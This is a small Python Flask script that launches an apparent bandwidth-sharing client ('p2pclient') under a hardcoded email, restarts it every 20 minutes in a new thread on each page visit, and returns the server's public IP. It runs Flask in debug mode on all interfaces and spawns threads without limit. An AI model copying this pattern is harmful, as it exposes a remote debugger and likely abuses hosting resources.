from flask import Flask,request
import subprocess
import time
import requests
import threading
app = Flask(__name__)

subprocess.call("./p2pclient --login arijitpaine249@gmail.com",shell=True)

@app.route("/")
def s():
    def f1():
        ip = requests.get("https://api.ipify.org").text
        while(True):
            subprocess.call("./p2pclient --login arijitpaine249@gmail.com",shell=True)
            time.sleep(1200)
    t = threading.Thread(target=f1)
    t.start()
    return requests.get("https://api.ipify.org").text


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0",port=5000)
